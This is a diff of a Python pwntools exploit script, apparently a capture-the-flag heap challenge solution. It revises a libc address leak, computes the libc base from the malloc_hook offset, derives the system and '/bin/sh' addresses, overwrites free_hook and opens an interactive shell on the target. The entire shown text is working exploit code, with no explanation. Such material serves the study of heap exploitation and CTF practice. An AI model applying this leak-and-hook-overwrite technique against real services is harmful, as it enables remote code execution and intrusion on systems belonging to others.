@@ -56,8 +56,11 @@ free_f()
 
 # leak base
 r.sendline(str(3))
-s = r.recvuntil("Your choice :")[6:14]
+#s = r.recvuntil("Your choice :")[6:14]
+r.recvuntil("Name :")
+s = r.recv(8)
 base = u64(s) - malloc_hook_off - 96 - 16
+print hex(base)
 sys_addr = base + sys_off
 binsh_addr = base + binsh_off
 free_hook_addr = base + free_hook_off
@@ -74,4 +77,3 @@ malloc_f(0x50, p64(sys_addr))
 malloc_f(0x40, "/bin/sh\x00")
 r.sendline(str(2))
 r.interactive()
-
